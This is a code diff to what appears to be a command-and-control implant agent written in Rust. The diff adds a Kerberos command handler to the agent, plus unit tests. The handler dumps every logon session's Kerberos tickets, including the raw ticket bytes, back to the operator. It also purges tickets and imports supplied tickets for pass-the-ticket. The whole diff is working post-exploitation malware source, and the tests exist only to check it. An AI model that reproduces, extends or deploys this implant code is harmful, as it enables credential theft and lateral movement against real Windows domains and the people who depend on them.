@@ -16,8 +16,8 @@ use std::process::{Command as SysCommand, Stdio};
 use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
-    DemonCommand, DemonFilesystemCommand, DemonInjectError, DemonInjectWay, DemonNetCommand,
-    DemonPackage, DemonProcessCommand, DemonTokenCommand, DemonTransferCommand,
+    DemonCommand, DemonFilesystemCommand, DemonInjectError, DemonInjectWay, DemonKerberosCommand,
+    DemonNetCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand, DemonTransferCommand,
 };
 use tracing::{info, warn};
 
@@ -132,6 +132,7 @@ pub fn dispatch(
         DemonCommand::CommandInjectDll => handle_inject_dll(&package.payload),
         DemonCommand::CommandSpawnDll => handle_spawn_dll(&package.payload),
         DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
+        DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -2339,6 +2340,218 @@ fn handle_token_find(subcmd_raw: u32) -> DispatchResult {
     write_u32_le(&mut out, 0); // success = FALSE
 
     DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
+}
+
+// ─── COMMAND_KERBEROS (2550) ────────────────────────────────────────────────
+
+/// Route a `CommandKerberos` task to the appropriate sub-handler.
+///
+/// Incoming payload (LE): `[subcmd: u32][…sub-handler args…]`
+fn handle_kerberos(payload: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandKerberos: failed to parse subcommand: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let subcmd = match DemonKerberosCommand::try_from(subcmd_raw) {
+        Ok(c) => c,
+        Err(_) => {
+            warn!(subcmd_raw, "CommandKerberos: unknown subcommand");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    info!(subcommand = ?subcmd, "CommandKerberos dispatch");
+
+    let rest = &payload[offset..];
+    match subcmd {
+        DemonKerberosCommand::Luid => handle_kerberos_luid(subcmd_raw),
+        DemonKerberosCommand::Klist => handle_kerberos_klist(subcmd_raw, rest),
+        DemonKerberosCommand::Purge => handle_kerberos_purge(subcmd_raw, rest),
+        DemonKerberosCommand::Ptt => handle_kerberos_ptt(subcmd_raw, rest),
+    }
+}
+
+/// `COMMAND_KERBEROS / Luid (0)` — get the current logon session LUID.
+///
+/// Incoming args: (none)
+/// Outgoing payload (LE): `[subcmd: u32][success: u32][high: u32][low: u32]`
+fn handle_kerberos_luid(subcmd_raw: u32) -> DispatchResult {
+    use crate::kerberos::native;
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::get_luid() {
+        Ok(luid) => {
+            write_u32_le(&mut out, 1); // success = TRUE
+            write_u32_le(&mut out, luid.high);
+            write_u32_le(&mut out, luid.low);
+        }
+        Err(err) => {
+            warn!(error_code = err, "Kerberos::Luid: failed to get LUID");
+            write_u32_le(&mut out, 0); // success = FALSE
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
+}
+
+/// `COMMAND_KERBEROS / Klist (1)` — list Kerberos tickets.
+///
+/// Incoming args (LE): `[type: u32][luid: u32 (only if type == 1)]`
+///   type 0 = /all (enumerate all sessions), type 1 = /luid (single session)
+/// Outgoing payload (LE): `[subcmd: u32][success: u32][session_count: u32][…sessions…]`
+fn handle_kerberos_klist(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    use crate::kerberos::native;
+
+    let mut offset = 0;
+    let list_type = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Kerberos::Klist: failed to parse type: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let target_luid = if list_type == 1 {
+        match parse_u32_le(rest, &mut offset) {
+            Ok(v) => Some(v),
+            Err(e) => {
+                warn!("Kerberos::Klist: failed to parse target LUID: {e}");
+                return DispatchResult::Ignore;
+            }
+        }
+    } else {
+        None
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::klist(target_luid) {
+        Ok(sessions) => {
+            write_u32_le(&mut out, 1); // success = TRUE
+            #[allow(clippy::cast_possible_truncation)]
+            write_u32_le(&mut out, sessions.len() as u32);
+
+            for session in &sessions {
+                write_utf16le(&mut out, &session.user_name);
+                write_utf16le(&mut out, &session.domain);
+                write_u32_le(&mut out, session.logon_id_low);
+                write_u32_le(&mut out, session.logon_id_high);
+                write_u32_le(&mut out, session.session);
+                write_utf16le(&mut out, &session.user_sid);
+                write_u32_le(&mut out, session.logon_time_low);
+                write_u32_le(&mut out, session.logon_time_high);
+                write_u32_le(&mut out, session.logon_type);
+                write_utf16le(&mut out, &session.auth_package);
+                write_utf16le(&mut out, &session.logon_server);
+                write_utf16le(&mut out, &session.logon_server_dns_domain);
+                write_utf16le(&mut out, &session.upn);
+
+                #[allow(clippy::cast_possible_truncation)]
+                write_u32_le(&mut out, session.tickets.len() as u32);
+
+                for ticket in &session.tickets {
+                    write_utf16le(&mut out, &ticket.client_name);
+                    write_utf16le(&mut out, &ticket.client_realm);
+                    write_utf16le(&mut out, &ticket.server_name);
+                    write_utf16le(&mut out, &ticket.server_realm);
+                    write_u32_le(&mut out, ticket.start_time_low);
+                    write_u32_le(&mut out, ticket.start_time_high);
+                    write_u32_le(&mut out, ticket.end_time_low);
+                    write_u32_le(&mut out, ticket.end_time_high);
+                    write_u32_le(&mut out, ticket.renew_time_low);
+                    write_u32_le(&mut out, ticket.renew_time_high);
+                    write_u32_le(&mut out, ticket.encryption_type);
+                    write_u32_le(&mut out, ticket.ticket_flags);
+                    write_bytes_le(&mut out, &ticket.ticket_data);
+                }
+            }
+        }
+        Err(err) => {
+            warn!(error_code = err, "Kerberos::Klist: failed to list tickets");
+            write_u32_le(&mut out, 0); // success = FALSE
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
+}
+
+/// `COMMAND_KERBEROS / Purge (2)` — purge Kerberos tickets for a LUID.
+///
+/// Incoming args (LE): `[luid: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
+fn handle_kerberos_purge(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    use crate::kerberos::native;
+
+    let mut offset = 0;
+    let target_luid = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Kerberos::Purge: failed to parse LUID: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::purge(target_luid) {
+        Ok(()) => {
+            write_u32_le(&mut out, 1); // success = TRUE
+        }
+        Err(err) => {
+            warn!(error_code = err, "Kerberos::Purge: failed to purge tickets");
+            write_u32_le(&mut out, 0); // success = FALSE
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
+}
+
+/// `COMMAND_KERBEROS / Ptt (3)` — pass-the-ticket (import a Kerberos ticket).
+///
+/// Incoming args (LE): `[ticket_len: u32][ticket: bytes][luid: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
+fn handle_kerberos_ptt(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    use crate::kerberos::native;
+
+    let mut offset = 0;
+    let ticket = match parse_bytes_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Kerberos::Ptt: failed to parse ticket: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let target_luid = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Kerberos::Ptt: failed to parse LUID: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    match native::ptt(&ticket, target_luid) {
+        Ok(()) => {
+            write_u32_le(&mut out, 1); // success = TRUE
+        }
+        Err(err) => {
+            warn!(error_code = err, "Kerberos::Ptt: failed to import ticket");
+            write_u32_le(&mut out, 0); // success = FALSE
+        }
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
 }
 
 // ─── Process injection handlers ──────────────────────────────────────────────
@@ -5590,5 +5803,159 @@ mod tests {
             panic!("expected Respond");
         };
         assert_eq!(resp.payload, 3u32.to_le_bytes());
+    }
+
+    // ── Kerberos tests ─────────────────────────────────────────────────────
+
+    /// Build a Kerberos task payload with the given subcommand and extra args.
+    fn kerberos_payload(subcmd: u32, extra: &[u8]) -> Vec<u8> {
+        let mut v = subcmd.to_le_bytes().to_vec();
+        v.extend_from_slice(extra);
+        v
+    }
+
+    #[test]
+    fn kerberos_dispatch_routes_to_handler() {
+        let payload = kerberos_payload(0, &[]); // Luid subcommand
+        let pkg = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandKerberos),
+            request_id: 1,
+            payload,
+        };
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::default();
+        let mut mem_files = MemFileStore::new();
+        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        // On non-Windows, get_luid returns error → success=FALSE.
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
+        // Parse: [subcmd=0][success=0]
+        assert!(resp.payload.len() >= 8);
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0); // subcmd
+        // On non-Windows, success is 0 (FALSE)
+        #[cfg(not(windows))]
+        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
+    }
+
+    #[test]
+    fn kerberos_luid_response_format() {
+        let result = handle_kerberos_luid(0);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
+        // Subcmd should be 0.
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0);
+        // On non-Windows: [subcmd=0][success=0] → 8 bytes
+        #[cfg(not(windows))]
+        assert_eq!(resp.payload.len(), 8);
+    }
+
+    #[test]
+    fn kerberos_klist_all_response_format() {
+        // type=0 means /all
+        let mut rest = Vec::new();
+        rest.extend_from_slice(&0u32.to_le_bytes()); // type = 0 (/all)
+        let result = handle_kerberos_klist(1, &rest);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
+        // [subcmd=1][success=0] on non-Windows → 8 bytes
+        #[cfg(not(windows))]
+        assert_eq!(resp.payload.len(), 8);
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1); // subcmd
+    }
+
+    #[test]
+    fn kerberos_klist_by_luid_response_format() {
+        // type=1 means /luid, then a LUID value
+        let mut rest = Vec::new();
+        rest.extend_from_slice(&1u32.to_le_bytes()); // type = 1 (/luid)
+        rest.extend_from_slice(&0x1234u32.to_le_bytes()); // target LUID
+        let result = handle_kerberos_klist(1, &rest);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1);
+    }
+
+    #[test]
+    fn kerberos_klist_missing_luid_ignored() {
+        // type=1 but no LUID value → parse error → Ignore
+        let rest = 1u32.to_le_bytes().to_vec(); // type = 1 (/luid), no LUID
+        let result = handle_kerberos_klist(1, &rest);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn kerberos_purge_response_format() {
+        let rest = 0xABCDu32.to_le_bytes().to_vec();
+        let result = handle_kerberos_purge(2, &rest);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 2); // subcmd
+        // On non-Windows: success = 0
+        #[cfg(not(windows))]
+        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
+    }
+
+    #[test]
+    fn kerberos_purge_missing_luid_ignored() {
+        let result = handle_kerberos_purge(2, &[]);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn kerberos_ptt_response_format() {
+        let ticket = vec![0x61, 0x82, 0x03, 0x00];
+        let luid: u32 = 0x5678;
+        let mut rest = Vec::new();
+        // Length-prefixed ticket bytes.
+        rest.extend_from_slice(&(ticket.len() as u32).to_le_bytes());
+        rest.extend_from_slice(&ticket);
+        rest.extend_from_slice(&luid.to_le_bytes());
+        let result = handle_kerberos_ptt(3, &rest);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 3); // subcmd
+        // On non-Windows: success = 0
+        #[cfg(not(windows))]
+        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
+    }
+
+    #[test]
+    fn kerberos_ptt_missing_ticket_ignored() {
+        let result = handle_kerberos_ptt(3, &[]);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn kerberos_ptt_missing_luid_after_ticket_ignored() {
+        // Valid ticket but no LUID after it.
+        let mut rest = Vec::new();
+        rest.extend_from_slice(&2u32.to_le_bytes()); // ticket length = 2
+        rest.extend_from_slice(&[0xAA, 0xBB]); // ticket data
+        // No LUID following → parse error.
+        let result = handle_kerberos_ptt(3, &rest);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn kerberos_unknown_subcommand_ignored() {
+        let payload = kerberos_payload(99, &[]); // invalid subcmd
+        let result = handle_kerberos(&payload);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn kerberos_empty_payload_ignored() {
+        let result = handle_kerberos(&[]);
+        assert!(matches!(result, DispatchResult::Ignore));
     }
 }
